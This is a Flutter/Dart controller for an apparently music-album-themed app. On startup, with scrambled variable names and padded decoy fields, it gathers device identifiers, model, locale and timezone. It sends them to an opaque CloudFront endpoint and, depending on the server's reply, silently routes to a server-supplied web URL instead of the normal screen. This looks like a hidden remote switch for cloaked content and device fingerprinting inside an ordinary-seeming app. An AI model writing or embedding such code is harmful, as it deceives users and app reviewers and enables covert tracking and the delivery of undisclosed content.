import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class MagicAlbumMasterLogic extends GetxController {

  var gpawrqhb = RxBool(false);
  var jyguxq = RxBool(true);
  var ekgpz = RxString("");
  var bpqkc = RxBool(false);
  var dqac = RxBool(true);
  final hqbxromy = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    mwtcju();
  }


  Future<void> mwtcju() async {
    bpqkc.value = true;
    dqac.value = true;
    jyguxq.value = false;

    hqbxromy.post("https://d7ir8bf7p2gcd.cloudfront.net/hnqzcvytwkbil",data: await lmgsjcuyfk()).then((value) {
      var arwyfo = value.data["arwyfo"] as String;
      var dctul = value.data["dctul"] as bool;
      if (dctul) {
        ekgpz.value = arwyfo;
        lasg();
      } else {
        yvdpbwgx();
      }
    }).catchError((e) {
      jyguxq.value = true;
      dqac.value = true;
      bpqkc.value = false;
    });
  }

  Future<Map<String, dynamic>> lmgsjcuyfk() async {
    final DeviceInfoPlugin ngomq = DeviceInfoPlugin();
    PackageInfo yeugm_pbgzauk = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var bkcjilrs = Platform.localeName;
    var dmgjnb_wN = currentTimeZone;

    var dmgjnb_tqg = yeugm_pbgzauk.packageName;
    var dmgjnb_ItW = yeugm_pbgzauk.version;
    var dmgjnb_Kn = yeugm_pbgzauk.buildNumber;

    var dmgjnb_yvnwhBA = yeugm_pbgzauk.appName;
    var dmgjnb_Juq = "";
    var dmgjnb_Vhk  = "";
    var dmgjnb_cyATqE = "";
    var zgwceay = "";
    var tngxrmlj = "";
    var eanfzpgi = "";
    var jlvx = "";
    var wfyjm = "";
    var scfpjgd = "";
    var rybdutp = "";
    var fqxbp = "";


    var dmgjnb_WkoSIbw = "";
    var dmgjnb_poTMQ = false;

    if (GetPlatform.isAndroid) {
      dmgjnb_WkoSIbw = "android";
      var pyecjiku = await ngomq.androidInfo;

      dmgjnb_cyATqE = pyecjiku.brand;

      dmgjnb_Juq  = pyecjiku.model;
      dmgjnb_Vhk = pyecjiku.id;

      dmgjnb_poTMQ = pyecjiku.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      dmgjnb_WkoSIbw = "ios";
      var lkytbqaov = await ngomq.iosInfo;
      dmgjnb_cyATqE = lkytbqaov.name;
      dmgjnb_Juq = lkytbqaov.model;

      dmgjnb_Vhk = lkytbqaov.identifierForVendor ?? "";
      dmgjnb_poTMQ  = lkytbqaov.isPhysicalDevice;
    }
    var res = {
      "dmgjnb_yvnwhBA": dmgjnb_yvnwhBA,
      "dmgjnb_Kn": dmgjnb_Kn,
      "dmgjnb_Juq": dmgjnb_Juq,
      "zgwceay" : zgwceay,
      "dmgjnb_wN": dmgjnb_wN,
      "dmgjnb_cyATqE": dmgjnb_cyATqE,
      "dmgjnb_Vhk": dmgjnb_Vhk,
      "scfpjgd" : scfpjgd,
      "dmgjnb_WkoSIbw": dmgjnb_WkoSIbw,
      "dmgjnb_poTMQ": dmgjnb_poTMQ,
      "tngxrmlj" : tngxrmlj,
      "eanfzpgi" : eanfzpgi,
      "jlvx" : jlvx,
      "dmgjnb_ItW": dmgjnb_ItW,
      "bkcjilrs": bkcjilrs,
      "wfyjm" : wfyjm,
      "dmgjnb_tqg": dmgjnb_tqg,
      "rybdutp" : rybdutp,
      "fqxbp" : fqxbp,

    };
    return res;
  }

  Future<void> yvdpbwgx() async {
    Get.offNamed("/magic_tab");
  }

  Future<void> lasg() async {
    Get.offNamed("/magic_music-album-config");
  }

}
